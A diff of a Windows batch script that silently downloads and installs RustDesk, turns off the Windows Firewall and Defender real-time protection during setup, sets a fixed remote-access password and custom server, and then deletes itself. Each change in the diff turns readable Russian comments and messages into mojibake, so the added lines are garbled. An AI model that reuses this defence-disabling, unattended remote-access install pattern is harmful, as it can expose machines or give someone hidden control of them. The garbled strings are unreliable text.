@@ -13,16 +13,16 @@ set "RD_VER=1.4.5"
 set "TMP_EXE=%TEMP%\rustdesk_setup.exe"
 
 REM -------------------------
-REM Проверка администратора
+REM РџСЂРѕРІРµСЂРєР° Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°
 REM -------------------------
 net session >nul 2>&1 || (
-    echo Требуются права администратора!
+    echo РўСЂРµР±СѓСЋС‚СЃСЏ РїСЂР°РІР° Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°!
     pause
     exit /b 1
 )
 
 REM -------------------------
-REM Определяем разрядность
+REM РћРїСЂРµРґРµР»СЏРµРј СЂР°Р·СЂСЏРґРЅРѕСЃС‚СЊ
 REM -------------------------
 set "ARCH=x86"
 
@@ -32,10 +32,10 @@ if defined PROCESSOR_ARCHITEW6432 (
     if "%PROCESSOR_ARCHITECTURE%"=="AMD64" set "ARCH=x64"
 )
 
-echo Обнаружена архитектура: %ARCH%
+echo РћР±РЅР°СЂСѓР¶РµРЅР° Р°СЂС…РёС‚РµРєС‚СѓСЂР°: %ARCH%
 
 REM -------------------------
-REM URL загрузки
+REM URL Р·Р°РіСЂСѓР·РєРё
 REM -------------------------
 if "%ARCH%"=="x64" (
     set "DL_URL=https://github.com/rustdesk/rustdesk/releases/download/%RD_VER%/rustdesk-%RD_VER%-x86_64.exe"
@@ -44,20 +44,20 @@ if "%ARCH%"=="x64" (
 )
 
 REM ===============================
-REM Выключаем Firewall и Defender
+REM Р’С‹РєР»СЋС‡Р°РµРј Firewall Рё Defender
 REM ===============================
-echo Отключаем Windows Firewall...
+echo РћС‚РєР»СЋС‡Р°РµРј Windows Firewall...
 netsh advfirewall set allprofiles state off >nul 2>&1
 
-echo Отключаем Защиту в реальном времени Windows Defender...
+echo РћС‚РєР»СЋС‡Р°РµРј Р—Р°С‰РёС‚Сѓ РІ СЂРµР°Р»СЊРЅРѕРј РІСЂРµРјРµРЅРё Windows Defender...
 powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
 REM -------------------------
-REM Скачиваем RustDesk
+REM РЎРєР°С‡РёРІР°РµРј RustDesk
 REM -------------------------
 if exist "%TMP_EXE%" del /f /q "%TMP_EXE%" >nul 2>&1
 
-echo Скачиваем RustDesk...
+echo РЎРєР°С‡РёРІР°РµРј RustDesk...
 
 where curl >nul 2>&1
 if %errorlevel% equ 0 (
@@ -66,14 +66,14 @@ if %errorlevel% equ 0 (
     certutil -urlcache -split -f "%DL_URL%" "%TMP_EXE%" >nul 2>&1
 )
 
-REM --- fallback через браузер ---
+REM --- fallback С‡РµСЂРµР· Р±СЂР°СѓР·РµСЂ ---
 if not exist "%TMP_EXE%" (
     echo.
-    echo ? Не удалось скачать автоматически.
-    echo Открываю страницу загрузки.
+    echo вќЊ РќРµ СѓРґР°Р»РѕСЃСЊ СЃРєР°С‡Р°С‚СЊ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё.
+    echo РћС‚РєСЂС‹РІР°СЋ СЃС‚СЂР°РЅРёС†Сѓ Р·Р°РіСЂСѓР·РєРё.
     explorer "%DL_URL%"
 
-    echo Ожидание появления rustdesk-*.exe в %USERPROFILE%\Downloads ...
+    echo РћР¶РёРґР°РЅРёРµ РїРѕСЏРІР»РµРЅРёСЏ rustdesk-*.exe РІ %USERPROFILE%\Downloads ...
     :WAIT_DOWNLOAD
     for %%F in ("%USERPROFILE%\Downloads\rustdesk*.exe") do (
         set "DL_FILE=%%F"
@@ -88,16 +88,16 @@ if not exist "%TMP_EXE%" (
 powershell -NoProfile -Command "Unblock-File -Path '%TMP_EXE%'"
 
 REM -------------------------
-REM Установка RustDesk
+REM РЈСЃС‚Р°РЅРѕРІРєР° RustDesk
 REM -------------------------
-echo Устанавливаем RustDesk...
+echo РЈСЃС‚Р°РЅР°РІР»РёРІР°РµРј RustDesk...
 start "" /wait "%TMP_EXE%" --silent-install
 timeout /t 20 >nul
 
 REM -------------------------
-REM Ожидание установки RustDesk
+REM РћР¶РёРґР°РЅРёРµ СѓСЃС‚Р°РЅРѕРІРєРё RustDesk
 REM -------------------------
-echo Ожидание появления rustdesk.exe...
+echo РћР¶РёРґР°РЅРёРµ РїРѕСЏРІР»РµРЅРёСЏ rustdesk.exe...
 
 set "EXE="
 set "WAITED=0"
@@ -125,13 +125,13 @@ set /a WAITED+=1
 goto WAIT_EXE
 
 :EXE_OK
-echo Найден rustdesk.exe: %EXE%
+echo РќР°Р№РґРµРЅ rustdesk.exe: %EXE%
 powershell -NoProfile -Command "Unblock-File -Path '%EXE%'"
 goto EXE_DONE
 
 :EXE_FAIL
-echo ? rustdesk.exe не появился за 60 секунд
-echo Установка, вероятно, не завершилась корректно.
+echo вќЊ rustdesk.exe РЅРµ РїРѕСЏРІРёР»СЃСЏ Р·Р° 60 СЃРµРєСѓРЅРґ
+echo РЈСЃС‚Р°РЅРѕРІРєР°, РІРµСЂРѕСЏС‚РЅРѕ, РЅРµ Р·Р°РІРµСЂС€РёР»Р°СЃСЊ РєРѕСЂСЂРµРєС‚РЅРѕ.
 pause
 exit /b 2
 
@@ -139,9 +139,9 @@ exit /b 2
 
 
 REM -------------------------
-REM Первый запуск
+REM РџРµСЂРІС‹Р№ Р·Р°РїСѓСЃРє
 REM -------------------------
-echo Инициализация RustDesk...
+echo РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ RustDesk...
 start "" "%EXE%"
 
 set "WAITCFG=0"
@@ -184,28 +184,28 @@ if not exist "%APPDATA%\RustDesk\config" md "%APPDATA%\RustDesk\config"
 ) > "%CONFIG2%"
 
 REM -------------------------
-REM Сервис + пароль
+REM РЎРµСЂРІРёСЃ + РїР°СЂРѕР»СЊ
 REM -------------------------
 "%EXE%" --install-service >nul 2>&1
 "%EXE%" --password "%FIXED_PW%" >nul 2>&1
 
 REM -------------------------
-REM Возвращаем защиту
+REM Р’РѕР·РІСЂР°С‰Р°РµРј Р·Р°С‰РёС‚Сѓ
 REM -------------------------
 netsh advfirewall set allprofiles state on >nul 2>&1
 powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1
 
 echo.
-echo RustDesk успешно установлен!
-echo Сервер: %SERVER_DOMAIN%
-echo Архитектура: %ARCH%
+echo RustDesk СѓСЃРїРµС€РЅРѕ СѓСЃС‚Р°РЅРѕРІР»РµРЅ!
+echo РЎРµСЂРІРµСЂ: %SERVER_DOMAIN%
+echo РђСЂС…РёС‚РµРєС‚СѓСЂР°: %ARCH%
 echo.
 
 timeout /t 5 >nul
 endlocal
 
 REM -------------------------
-REM Самоудаление
+REM РЎР°РјРѕСѓРґР°Р»РµРЅРёРµ
 REM -------------------------
 (
     echo @echo off
